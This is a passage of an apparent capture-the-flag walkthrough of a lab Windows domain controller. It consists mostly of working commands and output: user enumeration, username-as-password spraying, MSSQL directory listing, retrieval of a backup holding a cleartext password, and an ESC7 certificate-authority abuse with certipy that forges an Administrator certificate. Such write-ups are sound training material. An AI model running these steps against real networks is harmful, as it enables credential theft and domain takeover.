SMB         10.10.11.236    445    DC01             514: MANAGER\Domain Guests (SidTypeGroup)
SMB         10.10.11.236    445    DC01             515: MANAGER\Domain Computers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             516: MANAGER\Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             517: MANAGER\Cert Publishers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             518: MANAGER\Schema Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             519: MANAGER\Enterprise Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             520: MANAGER\Group Policy Creator Owners (SidTypeGroup)
SMB         10.10.11.236    445    DC01             521: MANAGER\Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             522: MANAGER\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.10.11.236    445    DC01             525: MANAGER\Protected Users (SidTypeGroup)
SMB         10.10.11.236    445    DC01             526: MANAGER\Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             527: MANAGER\Enterprise Key Admins (SidTypeGroup)
SMB         10.10.11.236    445    DC01             553: MANAGER\RAS and IAS Servers (SidTypeAlias)
SMB         10.10.11.236    445    DC01             571: MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             572: MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1000: MANAGER\DC01$ (SidTypeUser)
SMB         10.10.11.236    445    DC01             1101: MANAGER\DnsAdmins (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1102: MANAGER\DnsUpdateProxy (SidTypeGroup)
SMB         10.10.11.236    445    DC01             1103: MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
SMB         10.10.11.236    445    DC01             1113: MANAGER\Zhong (SidTypeUser)
SMB         10.10.11.236    445    DC01             1114: MANAGER\Cheng (SidTypeUser)
SMB         10.10.11.236    445    DC01             1115: MANAGER\Ryan (SidTypeUser)
SMB         10.10.11.236    445    DC01             1116: MANAGER\Raven (SidTypeUser)
SMB         10.10.11.236    445    DC01             1117: MANAGER\JinWoo (SidTypeUser)
SMB         10.10.11.236    445    DC01             1118: MANAGER\ChinHae (SidTypeUser)
SMB         10.10.11.236    445    DC01             1119: MANAGER\Operator (SidTypeUser)
```

`crackmapexec smb 10.10.11.236 -u 'guest' -p '' --rid-brute | grep 'SidTypeUser' | awk '{ print $6 }' | awk -F '\' '{ print $2 }' | awk '{ print tolower($0) }' | sort -u | grep -v '\$$' | tee ./domain_users.txt`:
```
administrator
cheng
chinhae
guest
jinwoo
krbtgt
operator
raven
ryan
zhong
```

`crackmapexec smb 10.10.11.236 -u ./domain_users.txt -p ./domain_users.txt --no-bruteforce --continue-on-success`:
```
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [-] manager.htb\administrator:administrator STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\cheng:cheng STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\chinhae:chinhae STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\guest:guest STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\jinwoo:jinwoo STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\krbtgt:krbtgt STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator ←
SMB         10.10.11.236    445    DC01             [-] manager.htb\raven:raven STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\ryan:ryan STATUS_LOGON_FAILURE 
SMB         10.10.11.236    445    DC01             [-] manager.htb\zhong:zhong STATUS_LOGON_FAILURE
```

`crackmapexec smb 10.10.11.236 -u 'operator' -p 'operator'`:
```
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator
```

`crackmapexec smb 10.10.11.236 -u 'operator' -p 'operator' --shares`:
```
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\operator:operator 
SMB         10.10.11.236    445    DC01             [*] Enumerated shares
SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
SMB         10.10.11.236    445    DC01             -----           -----------     ------
SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.236    445    DC01             C$                              Default share
SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.236    445    DC01             SYSVOL          READ            Logon server share 
```

`crackmapexec winrm 10.10.11.236 -u 'operator' -p 'operator'`:
```
SMB         10.10.11.236    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
HTTP        10.10.11.236    5985   DC01             [*] http://10.10.11.236:5985/wsman
HTTP        10.10.11.236    5985   DC01             [-] manager.htb\operator:operator
```
❌

`evil-winrm -i 10.10.11.236 -u 'operator' -p 'operator'`:
```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
                                        
Error: Exiting with code 1
```
❌

`crackmapexec mssql 10.10.11.236 -u 'operator' -p 'operator'`:
```
MSSQL       10.10.11.236    1433   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
MSSQL       10.10.11.236    1433   DC01             [+] manager.htb\operator:operator ←
```

`impacket-mssqlclient 'operator:operator@10.10.11.236' -windows-auth`:
```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query
```
```
SQL (MANAGER\Operator  guest@master)> xp_cmdshell whoami ←
ERROR(DC01\SQLEXPRESS): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL (MANAGER\Operator  guest@master)> enable_xp_cmdshell ←
ERROR(DC01\SQLEXPRESS): Line 105: User does not have permission to perform this action.
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
ERROR(DC01\SQLEXPRESS): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
ERROR(DC01\SQLEXPRESS): Line 1: You do not have permission to run the RECONFIGURE statement.
```
```
SQL (MANAGER\Operator  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee   grantor   
----------   --------   ---------------   ----------   -------   -------   
```
```
SQL (MANAGER\Operator  guest@master)> SELECT DB_NAME()
         
------   
master 
SQL (MANAGER\Operator  guest@master)> SELECT name FROM master..sysdatabases
name     
------   
master   

tempdb   

model    

msdb
```
```
SQL (MANAGER\Operator  guest@master)> xp_dirtree ←
subdirectory                depth   file   
-------------------------   -----   ----   
$Recycle.Bin                    1      0   

Documents and Settings          1      0   

inetpub                         1      0   

PerfLogs                        1      0   

Program Files                   1      0   

Program Files (x86)             1      0   

ProgramData                     1      0   

Recovery                        1      0   

SQL2019                         1      0   

System Volume Information       1      0   

Users                           1      0   

Windows                         1      0 
SQL (MANAGER\Operator  guest@master)> xp_dirtree C://inetpub/wwwroot/ ←
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   

contact.html                          1      1   

css                                   1      0   

images                                1      0   

index.html                            1      1   

js                                    1      0   

service.html                          1      1   

web.config                            1      1   

website-backup-27-07-23-old.zip       1      1 ←
```

`wget http://10.10.11.236/website-backup-27-07-23-old.zip`:
```
--2024-11-05 21:55:02--  http://10.10.11.236/website-backup-27-07-23-old.zip
Connecting to 10.10.11.236:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1045328 (1021K) [application/x-zip-compressed]
Saving to: ‘website-backup-27-07-23-old.zip’

website-backup-27-07-23-old.zip                 100%[====================================================================================================>]   1021K   638KB/s    in 1.6s    

2024-11-05 21:55:04 (638 KB/s) - ‘website-backup-27-07-23-old.zip’ saved [1045328/1045328] ←
```

`unzip ./*.zip -d ./website-backup`:
```
Archive:  ./website-backup-27-07-23-old.zip
  inflating: ./website-backup/.old-conf.xml ←
  inflating: ./website-backup/about.html  
  inflating: ./website-backup/contact.html  
  inflating: ./website-backup/css/bootstrap.css  
  inflating: ./website-backup/css/responsive.css  
  inflating: ./website-backup/css/style.css  
  inflating: ./website-backup/css/style.css.map  
  inflating: ./website-backup/css/style.scss  
  inflating: ./website-backup/images/about-img.png  
  inflating: ./website-backup/images/body_bg.jpg  
 extracting: ./website-backup/images/call.png  
 extracting: ./website-backup/images/call-o.png  
  inflating: ./website-backup/images/client.jpg  
  inflating: ./website-backup/images/contact-img.jpg  
 extracting: ./website-backup/images/envelope.png  
 extracting: ./website-backup/images/envelope-o.png  
  inflating: ./website-backup/images/hero-bg.jpg  
 extracting: ./website-backup/images/location.png  
 extracting: ./website-backup/images/location-o.png  
 extracting: ./website-backup/images/logo.png  
  inflating: ./website-backup/images/menu.png  
 extracting: ./website-backup/images/next.png  
 extracting: ./website-backup/images/next-white.png  
  inflating: ./website-backup/images/offer-img.jpg  
  inflating: ./website-backup/images/prev.png  
 extracting: ./website-backup/images/prev-white.png  
 extracting: ./website-backup/images/quote.png  
 extracting: ./website-backup/images/s-1.png  
 extracting: ./website-backup/images/s-2.png  
 extracting: ./website-backup/images/s-3.png  
 extracting: ./website-backup/images/s-4.png  
 extracting: ./website-backup/images/search-icon.png  
  inflating: ./website-backup/index.html  
  inflating: ./website-backup/js/bootstrap.js  
  inflating: ./website-backup/js/jquery-3.4.1.min.js  
  inflating: ./website-backup/service.html  
```

`cat ./website-backup/.old-conf.xml`:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<ldap-conf xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <server>
      <host>dc01.manager.htb</host>
      <open-port enabled="true">389</open-port>
      <secure-port enabled="false">0</secure-port>
      <search-base>dc=manager,dc=htb</search-base>
      <server-type>microsoft</server-type>
      <access-user>
         <user>raven@manager.htb</user> ←
         <password>R4v3nBe5tD3veloP3r!123</password> ←
      </access-user>
      <uid-attribute>cn</uid-attribute>
   </server>
   <search type="full">
      <dir-list>
         <dir>cn=Operator1,CN=users,dc=manager,dc=htb</dir>
      </dir-list>
   </search>
</ldap-conf>
```

`crackmapexec smb 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'`:
```
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 ←
```

`crackmapexec smb 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' --shares`:
```
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 
SMB         10.10.11.236    445    DC01             [*] Enumerated shares
SMB         10.10.11.236    445    DC01             Share           Permissions     Remark
SMB         10.10.11.236    445    DC01             -----           -----------     ------
SMB         10.10.11.236    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.236    445    DC01             C$                              Default share
SMB         10.10.11.236    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.236    445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.236    445    DC01             SYSVOL          READ            Logon server share
```

`crackmapexec smb 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -x 'whoami'`:
```
SMB         10.10.11.236    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:manager.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.236    445    DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 
```
❌

`crackmapexec winrm 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'`:
```
SMB         10.10.11.236    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:manager.htb)
HTTP        10.10.11.236    5985   DC01             [*] http://10.10.11.236:5985/wsman
HTTP        10.10.11.236    5985   DC01             [+] manager.htb\raven:R4v3nBe5tD3veloP3r!123 (Pwn3d!) ←
```

`evil-winrm -i 10.10.11.236 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'`:
```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Raven\Documents>
```

![Victim: raven](https://custom-icon-badges.demolab.com/badge/Victim-raven-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
manager\raven
```

`dir C://Users/raven/Desktop`:
```
    Directory: C:\Users\raven\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/4/2024   5:26 AM             34 user.txt ←
```

`type C://Users/raven/Desktop/user.txt`:
```
284e5*************************** ←
```

`whoami /all`:
```
USER INFORMATION
----------------

User Name     SID
============= ==============================================
manager\raven S-1-5-21-4078382237-1492182817-2568127209-1116


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

`dir C://Users`:
```
    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/29/2023   2:34 PM                Administrator
d-r---        7/20/2021  12:23 PM                Public
d-----        7/27/2023   8:23 AM                Raven
```

`net user`:
```
User accounts for \\

-------------------------------------------------------------------------------
Administrator            Cheng                    ChinHae
Guest                    JinWoo                   krbtgt
Operator                 Raven                    Ryan
Zhong
The command completed with one or more errors.
```

`net user raven`:
```
User name                    Raven ←
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/27/2023 7:23:10 AM
Password expires             Never
Password changeable          7/28/2023 7:23:10 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   7/27/2023 7:23:57 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use ←
Global Group memberships     *Domain Users ←
The command completed successfully.
```

`net group`:
```
Group Accounts for \\

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Schema Admins
The command completed with one or more errors.
```

`net localgroup`:
```
Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers ←
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*SQLServer2005SQLBrowserUser$DC01
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

`net localgroup "Cert Publishers"`:
```
Alias name     Cert Publishers
Comment        Members of this group are permitted to publish certificates to the directory

Members

-------------------------------------------------------------------------------
DC01$ ←
The command completed successfully.
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`cp ~/tools/SharpCollection/NetFramework_4.7_Any/Certify.exe ./certify.exe`

`upload ./certify.exe`:
```
Info: Uploading /home/kali/certify.exe to C:\Users\Raven\Desktop\certify.exe
                                        
Data: 238248 bytes of 238248 bytes copied
                                        
Info: Upload successful!
```

![Victim: raven](https://custom-icon-badges.demolab.com/badge/Victim-raven-64b5f6?logo=windows11&logoColor=white)

`./certify.exe cas`:
```
   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate authorities
[*] Using the search base 'CN=Configuration,DC=manager,DC=htb'


[*] Root CAs

    Cert SubjectName              : CN=manager-DC01-CA, DC=manager, DC=htb ←
    Cert Thumbprint               : ACE850A2892B1614526F7F2151EE76E752415023
    Cert Serial                   : 5150CE6EC048749448C7390A52F264BB
    Cert Start Date               : 7/27/2023 3:21:05 AM
    Cert End Date                 : 7/27/2122 3:31:04 AM
    Cert Chain                    : CN=manager-DC01-CA,DC=manager,DC=htb



[*] NTAuthCertificates - Certificates that enable authentication:

    Cert SubjectName              : CN=manager-DC01-CA, DC=manager, DC=htb
    Cert Thumbprint               : ACE850A2892B1614526F7F2151EE76E752415023
    Cert Serial                   : 5150CE6EC048749448C7390A52F264BB
    Cert Start Date               : 7/27/2023 3:21:05 AM
    Cert End Date                 : 7/27/2122 3:31:04 AM
    Cert Chain                    : CN=manager-DC01-CA,DC=manager,DC=htb


[*] Enterprise/Enrollment CAs:

    Enterprise CA Name            : manager-DC01-CA
    DNS Hostname                  : dc01.manager.htb
    FullName                      : dc01.manager.htb\manager-DC01-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=manager-DC01-CA, DC=manager, DC=htb
    Cert Thumbprint               : ACE850A2892B1614526F7F2151EE76E752415023
    Cert Serial                   : 5150CE6EC048749448C7390A52F264BB
    Cert Start Date               : 7/27/2023 3:21:05 AM
    Cert End Date                 : 7/27/2122 3:31:04 AM
    Cert Chain                    : CN=manager-DC01-CA,DC=manager,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Deny   ManageCA, Read                             MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
      Allow  ManageCA, Enroll                           MANAGER\Raven                 S-1-5-21-4078382237-1492182817-2568127209-1116
      Allow  Enroll                                     MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
    Enrollment Agent Restrictions : None

    Enabled Certificate Templates:
        SubCA
        DirectoryEmailReplication
        DomainControllerAuthentication
        KerberosAuthentication
        EFSRecovery
        EFS
        DomainController
        WebServer
        Machine
        User
        Administrator



Certify completed in 00:00:17.8208341
```

`./certify.exe find /vulnerable`:
```
   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=manager,DC=htb'

[*] Listing info about the Enterprise CA 'manager-DC01-CA'

    Enterprise CA Name            : manager-DC01-CA ←
    DNS Hostname                  : dc01.manager.htb
    FullName                      : dc01.manager.htb\manager-DC01-CA ←
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=manager-DC01-CA, DC=manager, DC=htb
    Cert Thumbprint               : ACE850A2892B1614526F7F2151EE76E752415023
    Cert Serial                   : 5150CE6EC048749448C7390A52F264BB
    Cert Start Date               : 7/27/2023 3:21:05 AM
    Cert End Date                 : 7/27/2122 3:31:04 AM
    Cert Chain                    : CN=manager-DC01-CA,DC=manager,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                : ←
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Deny   ManageCA, Read                             MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
      Allow  ManageCA, Enroll                           MANAGER\Raven ←                S-1-5-21-4078382237-1492182817-2568127209-1116
      Allow  Enroll                                     MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
    Enrollment Agent Restrictions : None

[+] No Vulnerable Certificates Templates found! ←



Certify completed in 00:00:09.8456391
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

We'll attempt to identify potential misconfigurations within the Certification Authority. Let's utilize
`certipy` to find any vulnerabilities that may exist.

`certipy-ad find -u 'raven' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -stdout -vulnerable`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'manager-DC01-CA' via CSRA
[*] Got CA configuration for 'manager-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA ←
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : CN=manager-DC01-CA, DC=manager, DC=htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : MANAGER.HTB\Administrators
      Access Rights
        Enroll                          : MANAGER.HTB\Operator
                                          MANAGER.HTB\Authenticated Users
                                          MANAGER.HTB\Raven ←
        ManageCertificates              : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
        ManageCa                        : MANAGER.HTB\Administrators
                                          MANAGER.HTB\Domain Admins
                                          MANAGER.HTB\Enterprise Admins
                                          MANAGER.HTB\Raven ←
    [!] Vulnerabilities ←
      ESC7                              : 'MANAGER.HTB\\Raven' has dangerous permissions ←
Certificate Templates                   : [!] Could not find any certificate templates ←
```

The report indicates that the user `Raven` possesses hazardous permissions, particularly having
`ManageCA` rights over the Certification Authority. This implies that by leveraging the ESC7 scenario, we could potentially elevate our privileges to Domain Admin while operating as user `Raven`. A detailed explanation about the exploitation process for the ESC7 scenario can be found
[here](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#vulnerable-certificate-authority-access-control-esc7).
To exploit this, we'll need to first add `Raven` as an "officer", so that we can manage certificates and issue them manually.

`certipy-ad ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-DC01-CA -add-officer 'raven' -debug`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[+] Authenticating to LDAP server
[+] Bound to ldaps://10.10.11.236:636 - ssl
[+] Default path: DC=manager,DC=htb
[+] Configuration path: CN=Configuration,DC=manager,DC=htb
[+] Trying to get DCOM connection for: 10.10.11.236
[*] Successfully added officer 'Raven' on 'manager-DC01-CA' ←
```

Now that we are officer, we can issue and manage certificates. The `SubCA` template can be
enabled on the CA with the `-enable-template` flag.

`certipy-ad ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-DC01-CA -enable-template SubCA`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'manager-DC01-CA' ←
```

The enabled certificate templates can be listed using the `-list-templates` flag.

`certipy-ad ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-DC01-CA -list-templates`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Enabled certificate templates on 'manager-DC01-CA':
    SubCA ←
    DirectoryEmailReplication
    DomainControllerAuthentication
    KerberosAuthentication
    EFSRecovery
    EFS
    DomainController
    WebServer
    Machine
    User
    Administrator
```

The prerequisites for the attack are now fulfilled. We have `Manage Certificates` permission,
granted through `ManageCA` , and have ensured that the `SubCA` template is enabled.
Now let us request a certificate based on the `SubCA` template. This request will be denied, but we
will obtain a request ID and a private key, which we save to a file.

`certipy-ad req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-DC01-CA -template SubCA -upn Administrator@manager.htb`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate. ←
[*] Request ID is 25 ←
Would you like to save the private key? (y/N) y ←
[*] Saved private key to 25.key ←
[-] Failed to request certificate
```

We note that the certificate request ID is 25. Let us now use our obtained permissions to manually
issue the failed certificate with the ca command and the `-issue-request <request ID>`
parameter.

`certipy-ad ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-DC01-CA -issue-request 25`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate ←
```

Finally, we retrieve the issued certificate with the `req` command and the `-retrieve <request
ID>` parameter.

`certipy-ad req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.10.11.236 -ca manager-DC01-CA -retrieve 25`:
```
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 25
[*] Successfully retrieved certificate ←
[*] Got certificate with UPN 'Administrator@manager.htb'
[*] Certificate has no object SID
[*] Loaded private key from '25.key'
[*] Saved certificate and private key to 'administrator.pfx' ←
```

